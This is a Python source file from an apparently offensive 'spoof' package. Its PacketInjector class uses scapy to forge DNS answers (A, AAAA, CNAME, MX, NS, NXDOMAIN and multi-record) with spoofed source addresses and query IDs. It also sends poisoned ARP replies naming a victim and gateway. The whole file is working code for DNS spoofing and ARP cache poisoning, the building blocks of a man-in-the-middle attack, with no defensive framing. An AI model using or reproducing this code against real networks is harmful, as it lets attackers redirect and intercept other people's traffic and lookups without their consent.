from __future__ import annotations

import scapy.all as scapy
from loguru import logger

from spoof.platform import get_platform


class PacketInjector:
    def __init__(self, interface: str):
        self._platform = get_platform()
        self._interface = interface

    def send_dns_response(
        self,
        *,
        src_ip: str,
        dst_ip: str,
        src_port: int,
        dst_port: int,
        query_id: int,
        query_domain: str,
        answer_ip: str,
        ttl: int = 300,
    ) -> bool:
        try:
            dns_response = (
                scapy.IP(src=src_ip, dst=dst_ip)
                / scapy.UDP(sport=src_port, dport=dst_port)
                / scapy.DNS(
                    id=query_id,
                    qr=1,
                    aa=1,
                    rd=1,
                    ra=1,
                    qd=scapy.DNSQR(qname=query_domain, qtype="A"),
                    an=scapy.DNSRR(
                        rrname=query_domain,
                        rdata=answer_ip,
                        ttl=ttl,
                        type="A",
                    ),
                )
            )
            scapy.sendp(
                scapy.Ether() / dns_response,
                iface=self._interface,
                verbose=False,
            )
            return True
        except Exception as e:
            logger.error(f"send_dns_response failed: {e}")
            return False

    def send_dns_nxdomain(
        self,
        *,
        src_ip: str,
        dst_ip: str,
        src_port: int,
        dst_port: int,
        query_id: int,
        query_domain: str,
    ) -> bool:
        try:
            dns_response = (
                scapy.IP(src=src_ip, dst=dst_ip)
                / scapy.UDP(sport=src_port, dport=dst_port)
                / scapy.DNS(
                    id=query_id,
                    qr=1,
                    aa=1,
                    rd=1,
                    ra=1,
                    rcode=3,
                    qd=scapy.DNSQR(qname=query_domain, qtype="A"),
                )
            )
            scapy.sendp(
                scapy.Ether() / dns_response,
                iface=self._interface,
                verbose=False,
            )
            return True
        except Exception as e:
            logger.error(f"send_dns_nxdomain failed: {e}")
            return False

    def send_dns_cname_response(
        self, *, src_ip: str, dst_ip: str, src_port: int, dst_port: int,
        query_id: int, query_domain: str, cname_target: str, ttl: int = 300,
    ) -> bool:
        try:
            dns_response = (
                scapy.IP(src=src_ip, dst=dst_ip)
                / scapy.UDP(sport=src_port, dport=dst_port)
                / scapy.DNS(
                    id=query_id, qr=1, aa=1, rd=1, ra=1,
                    qd=scapy.DNSQR(qname=query_domain, qtype="A"),
                    an=scapy.DNSRR(rrname=query_domain, rdata=cname_target, ttl=ttl, type="CNAME"),
                )
            )
            scapy.sendp(scapy.Ether() / dns_response, iface=self._interface, verbose=False)
            return True
        except Exception as e:
            logger.error(f"send_dns_cname_response failed: {e}")
            return False

    def send_dns_mx_response(
        self, *, src_ip: str, dst_ip: str, src_port: int, dst_port: int,
        query_id: int, query_domain: str, mx_server: str, preference: int = 10, ttl: int = 300,
    ) -> bool:
        try:
            rdata = f"{preference} {mx_server}"
            dns_response = (
                scapy.IP(src=src_ip, dst=dst_ip)
                / scapy.UDP(sport=src_port, dport=dst_port)
                / scapy.DNS(
                    id=query_id, qr=1, aa=1, rd=1, ra=1,
                    qd=scapy.DNSQR(qname=query_domain, qtype="MX"),
                    an=scapy.DNSRR(rrname=query_domain, rdata=rdata, ttl=ttl, type="MX"),
                )
            )
            scapy.sendp(scapy.Ether() / dns_response, iface=self._interface, verbose=False)
            return True
        except Exception as e:
            logger.error(f"send_dns_mx_response failed: {e}")
            return False

    def send_dns_ns_response(
        self, *, src_ip: str, dst_ip: str, src_port: int, dst_port: int,
        query_id: int, query_domain: str, ns_server: str, ttl: int = 300,
    ) -> bool:
        try:
            dns_response = (
                scapy.IP(src=src_ip, dst=dst_ip)
                / scapy.UDP(sport=src_port, dport=dst_port)
                / scapy.DNS(
                    id=query_id, qr=1, aa=1, rd=1, ra=1,
                    qd=scapy.DNSQR(qname=query_domain, qtype="NS"),
                    an=scapy.DNSRR(rrname=query_domain, rdata=ns_server, ttl=ttl, type="NS"),
                )
            )
            scapy.sendp(scapy.Ether() / dns_response, iface=self._interface, verbose=False)
            return True
        except Exception as e:
            logger.error(f"send_dns_ns_response failed: {e}")
            return False

    def send_dns_aaaa_response(
        self, *, src_ip: str, dst_ip: str, src_port: int, dst_port: int,
        query_id: int, query_domain: str, answer_ipv6: str, ttl: int = 300,
    ) -> bool:
        try:
            dns_response = (
                scapy.IP(src=src_ip, dst=dst_ip)
                / scapy.UDP(sport=src_port, dport=dst_port)
                / scapy.DNS(
                    id=query_id, qr=1, aa=1, rd=1, ra=1,
                    qd=scapy.DNSQR(qname=query_domain, qtype="AAAA"),
                    an=scapy.DNSRR(rrname=query_domain, rdata=answer_ipv6, ttl=ttl, type="AAAA"),
                )
            )
            scapy.sendp(scapy.Ether() / dns_response, iface=self._interface, verbose=False)
            return True
        except Exception as e:
            logger.error(f"send_dns_aaaa_response failed: {e}")
            return False

    def send_dns_multi_record_response(
        self, *, src_ip: str, dst_ip: str, src_port: int, dst_port: int,
        query_id: int, query_domain: str, records: list[tuple], ttl: int = 300,
    ) -> bool:
        try:
            dns_layer = scapy.DNS(
                id=query_id, qr=1, aa=1, rd=1, ra=1,
                qd=scapy.DNSQR(qname=query_domain, qtype="A"),
            )
            dns_layer.ancount = len(records)
            dns_answers = []
            for rec_type, rec_value in records:
                dns_answers.append(
                    scapy.DNSRR(rrname=query_domain, rdata=rec_value, ttl=ttl, type=rec_type)
                )
            if dns_answers:
                dns_layer.an = dns_answers[0] if len(dns_answers) == 1 else dns_answers

            dns_response = (
                scapy.IP(src=src_ip, dst=dst_ip)
                / scapy.UDP(sport=src_port, dport=dst_port)
                / dns_layer
            )
            scapy.sendp(scapy.Ether() / dns_response, iface=self._interface, verbose=False)
            return True
        except Exception as e:
            logger.error(f"send_dns_multi_record_response failed: {e}")
            return False

    def send_arp_reply(
        self,
        *,
        src_mac: str,
        dst_mac: str,
        spoof_ip: str,
        target_ip: str,
        interface: str = None,
    ) -> bool:
        try:
            iface = interface or self._interface
            pkt = scapy.Ether(src=src_mac, dst=dst_mac) / scapy.ARP(
                op=2,
                hwsrc=src_mac,
                psrc=spoof_ip,
                hwdst=dst_mac,
                pdst=target_ip,
            )
            scapy.sendp(pkt, iface=iface, verbose=False)
            return True
        except Exception as e:
            logger.error(f"send_arp_reply failed: {e}")
            return False

    def send_arp_restore(
        self,
        *,
        real_gateway_mac: str,
        victim_ip: str,
        victim_mac: str,
        gateway_ip: str,
        interface: str = None,
    ) -> bool:
        try:
            iface = interface or self._interface
            pkt = scapy.Ether(src=real_gateway_mac, dst=victim_mac) / scapy.ARP(
                op=2,
                hwsrc=real_gateway_mac,
                psrc=gateway_ip,
                hwdst=victim_mac,
                pdst=victim_ip,
            )
            scapy.sendp(pkt, iface=iface, count=5, inter=0.2, verbose=False)
            return True
        except Exception as e:
            logger.error(f"send_arp_restore failed: {e}")
            return False

    def resolve_mac(self, ip: str, interface: str = None) -> str | None:
        try:
            iface = interface or self._interface
            ans = scapy.arping(ip, timeout=3, verbose=False, iface=iface)
            if ans and ans[0]:
                return ans[0][0][1].hwsrc
        except Exception as e:
            logger.debug(f"resolve_mac failed for {ip}: {e}")
        return None
